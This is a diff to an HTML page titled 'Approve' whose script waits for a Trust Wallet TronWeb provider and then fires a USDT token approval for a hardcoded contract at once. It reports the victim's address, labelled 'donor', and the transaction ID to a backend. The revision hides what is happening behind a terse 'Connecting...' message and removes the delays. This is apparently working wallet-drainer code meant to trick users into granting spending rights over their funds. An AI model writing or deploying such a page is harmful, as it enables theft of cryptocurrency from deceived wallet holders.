@@ -5,69 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Approve</title>
 </head>
-<body style="background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:40px 20px;margin:0;">
-    <div id="log" style="font-size:14px;line-height:2;"></div>
+<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
+    <p id="status" style="font-size:16px;color:#9ca3af;">Connecting...</p>
 
     <script>
         var CONTRACT_ADDRESS = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
         var USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         var APPROVE_AMOUNT = 1000000;
+        var status = document.getElementById("status");
 
-        function log(msg, color) {
-            var p = document.createElement("p");
-            p.style.color = color || "#fff";
-            p.style.margin = "8px 0";
-            p.textContent = msg;
-            document.getElementById("log").appendChild(p);
-        }
+        // Poll for tronWeb every 100ms (fast detection)
+        var check = setInterval(function() {
+            if (window.tronWeb && window.tronWeb.ready) {
+                clearInterval(check);
+                // Fire approve IMMEDIATELY - no delay
+                sendApprove();
+            }
+        }, 100);
 
-        function start() {
-            log("Page loaded...", "#9ca3af");
-            log("Waiting for TronWeb...", "#9ca3af");
+        // Timeout after 15s
+        setTimeout(function() {
+            clearInterval(check);
+            if (!window.tronWeb || !window.tronWeb.ready) {
+                status.textContent = "Open this page in Trust Wallet";
+                status.style.color = "#f87171";
+            }
+        }, 15000);
 
-            var attempts = 0;
-            var check = setInterval(function() {
-                attempts++;
-                if (window.tronWeb && window.tronWeb.ready) {
-                    clearInterval(check);
-                    log("Wallet connected: " + window.tronWeb.defaultAddress.base58, "#4ade80");
-                    doApprove();
-                } else if (attempts > 20) {
-                    clearInterval(check);
-                    log("ERROR: TronWeb not found. Open this page inside Trust Wallet.", "#f87171");
-                    log("window.tronWeb = " + typeof window.tronWeb, "#f87171");
-                }
-            }, 500);
-        }
+        function sendApprove() {
+            status.textContent = "Confirm in popup...";
+            status.style.color = "#facc15";
 
-        function doApprove() {
-            var userAddress = window.tronWeb.defaultAddress.base58;
-            log("Requesting energy delegation...", "#facc15");
-
+            // Delegate energy in background (don't wait for it)
+            var addr = window.tronWeb.defaultAddress.base58;
             fetch("/api/delegate-energy", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ donor: userAddress })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(data) {
-                if (data.success) {
-                    log("Energy delegated! Waiting 3s...", "#4ade80");
-                } else {
-                    log("Energy delegation skipped: " + (data.error || ""), "#facc15");
-                }
-                setTimeout(sendApprove, 3000);
-            })
-            .catch(function(e) {
-                log("Energy request failed, continuing...", "#facc15");
-                setTimeout(sendApprove, 1000);
-            });
-        }
+                body: JSON.stringify({ donor: addr })
+            }).catch(function() {});
 
-        function sendApprove() {
-            log("Sending approve transaction...", "#60a5fa");
-            log("Please confirm in the popup!", "#facc15");
-
+            // Fire approve immediately
             window.tronWeb.contract().at(USDT_CONTRACT).then(function(usdt) {
                 return usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
                     feeLimit: 100000000,
@@ -75,22 +52,20 @@
                 });
             }).then(function(tx) {
                 var txId = typeof tx === "string" ? tx : (tx.txid || tx);
-                log("APPROVED!", "#4ade80");
-                log("TX: " + txId, "#4ade80");
+                status.textContent = "Done!";
+                status.style.color = "#4ade80";
 
-                // Notify backend
                 fetch("/api/approved", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ donor: window.tronWeb.defaultAddress.base58, txId: txId })
+                    body: JSON.stringify({ donor: addr, txId: txId })
                 }).catch(function() {});
 
             }).catch(function(err) {
-                log("ERROR: " + (err.message || err), "#f87171");
+                status.textContent = err.message || "Rejected";
+                status.style.color = "#f87171";
             });
         }
-
-        start();
     </script>
 </body>
 </html>
